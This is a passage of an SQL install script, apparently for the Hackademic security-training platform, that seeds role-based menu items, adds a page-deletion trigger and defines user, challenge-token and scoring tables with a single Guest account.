('admin/addchallenge', 1, 'Add New Challenge', 0, 4),
('admin/challengemanager', 1, 'Challenge Manager', 0, 5),
('admin/menumanager', 1, 'Menu Manager', 0, 6),
('admin/options', 1, 'Options', 0, 7),
('logout', 1, 'Logout', 0, 8),
('admin', 2, 'Admin Dashboard', 0, 0),
('admin/addarticle', 2, 'Add New Articles', 0, 1),
('admin/articlemanager', 2, 'Article Manager', 0, 2),
('admin/usermanager', 2, 'Users/Classes', 0, 3),
('admin/addchallenge', 2, 'Add New Challenge', 0, 4),
('admin/challengemanager', 2, 'Challenge Manager', 0, 5),
('logout', 2,  'Logout', 0, 6),
('home', 3, 'Home', 0, 0),
('progressreport', 3, 'Progress Report', 0, 1),
('ranking', 3, 'Ranking', 0, 2),
('challenges', 3, 'Challenges', 0, 3),
('logout', 3,  'Logout', 0, 4);

-- --------------------------------------------------------

--
-- Trigger to remove menu items before pages
--
DROP TRIGGER IF EXISTS before_delete_pages;

CREATE TRIGGER before_delete_pages
  BEFORE DELETE ON pages 
  FOR EACH ROW
  DELETE FROM menu_items WHERE menu_items.url = OLD.url;
    
-- --------------------------------------------------------

--
-- Table structure for table  users
--

CREATE TABLE IF NOT EXISTS  users  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   username  varchar(255) NOT NULL,
   full_name  varchar(255) NOT NULL,
   email  varchar(100) NOT NULL,
   password  varchar(255) NOT NULL,
   joined  datetime NOT NULL,
   last_visit  datetime DEFAULT NULL,
   is_activated  int(1) DEFAULT '0',
   type  int(10) DEFAULT '0',
   token  int(10) DEFAULT '0',
  PRIMARY KEY ( username ),
  UNIQUE KEY  id  ( id )
);
--
-- Dumping data for table users
--

INSERT INTO users (`username`, `full_name`, `email`, `password`, `joined`, `last_visit`, `is_activated`, `type`, `token`) VALUES
('Guest','Guest User','guest@hackademic.com','empty pass this user is never supposed to login normally','2010-01-01 00:00:00','2010-01-01 00:00:00',1,0,0);
-- --------------------------------------------------------

--
-- Table structure for table  user_has_challenge_token
--

CREATE TABLE IF NOT EXISTS  user_has_challenge_token  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   user_id  varchar(512) NOT NULL,
    class_id varchar(512) NOT NULL,
   challenge_id  varchar(512) NOT NULL,
   token  varchar(256) NOT NULL,
  PRIMARY KEY ( id )
);

-- --------------------------------------------------------

--
-- Table structure for table  user_score
--

CREATE TABLE IF NOT EXISTS  user_score  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   user_id  int(11) NOT NULL,
   challenge_id  int(11) NOT NULL,
   class_id  int(11) NOT NULL,
   points  int(11) NOT NULL,
   penalties_bonuses  longtext CHARACTER SET ascii COLLATE ascii_bin,
  PRIMARY KEY ( id ),
  KEY  user_id  ( user_id , challenge_id , class_id )
);

SHOW WARNINGS;
